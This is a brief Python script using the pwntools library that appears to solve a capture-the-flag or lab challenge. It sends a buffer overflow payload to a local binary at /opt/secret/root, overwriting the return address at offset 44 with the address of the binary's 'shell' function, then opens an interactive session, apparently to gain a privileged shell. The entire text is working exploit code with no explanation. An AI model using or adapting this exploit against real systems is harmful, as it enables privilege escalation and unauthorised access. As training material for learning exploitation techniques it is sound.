from pwn import *                                                                                                                                                    
proc = process('/opt/secret/root')                                                                                                                                   
elf = ELF('/opt/secret/root')                                                                                                                                        
shell_func = elf.symbols.shell                                                                                                                                       
                                                                                                                                                                     
#### this adds value of shell_func after 44 chars ####################                                                                                               
payload = fit({44: shell_func})                                                                                                                                      
                                                                                                                                                                     
proc.sendline(payload)                                                                                                                                               
proc.interactive()                                           
